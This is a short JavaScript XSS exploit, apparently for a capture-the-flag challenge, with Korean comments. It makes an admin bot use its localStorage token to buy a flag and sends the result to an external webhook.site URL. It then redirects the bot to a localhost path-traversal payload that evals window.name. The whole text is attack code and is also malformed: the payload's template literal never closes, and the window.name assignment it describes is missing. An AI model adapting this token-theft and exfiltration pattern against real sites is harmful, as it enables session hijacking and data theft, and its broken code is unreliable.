<script>
    // 1. 관리자 봇이 실행할 실제 공격 코드 (플래그 구매 및 웹후크 전송)
    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
    const payload = `
        fetch('/4/buy', {
            method: 'POST',
            headers: { 'token': localStorage.getItem('token') }
        })
        .then(r => r.json())
        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)));

    // 2. window.name에 페이로드 저장 (도메인이 바뀌어도 유지됨)

    // 3. 다시 localhost의 XSS 취약 지점으로 리다이렉트

    const xss_id = "1%2f..%2f..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
    location.href = "http://localhost:3000/#/" + xss_id + "/detail";
</script>
